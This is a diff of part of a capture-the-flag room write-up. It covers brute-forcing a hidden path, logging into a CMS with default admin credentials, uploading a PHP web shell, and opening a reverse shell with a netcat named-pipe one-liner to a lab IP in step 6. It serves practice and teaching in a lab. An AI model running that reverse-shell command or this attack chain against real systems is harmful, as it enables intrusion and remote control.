@@ -24,7 +24,7 @@ An easy-ish room (solved it in under an hour, which is good for me), with some n
   
 4. Now I was able to brute force the number, using Intruder to attack with 500 threads and all numbers from 10000 to 99999 (as the answer field showed five digits). Getting the right number revealed a hidden path under the 80 site.
 
-5. On this site was a CMS (won't say the type as its a spoiler). I was able to find credentials on one of its pages on the site-map, which turned out to be publically documented default credentials. There was also a known exploit, where if you have creds for an admin user (as the default user is) you can access a file upload screen that doesn't do any vetting. 
+5. On this site was a CMS (won't say the type as its one of the question answers). I was able to find credentials on one of its pages on the site-map, which turned out to be publically documented default credentials. There was also a known exploit, where if you have creds for an admin user (as the default user is) you can access a file upload screen that doesn't do any vetting. The version of the CMS was one of the other questions - I submitted the verion on the exploit entry from exploit-db, which was correct.
 
 6. Uploading a PHP web shell, I connected back to my attack machine with `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.7.78 4444 >/tmp/f`
 
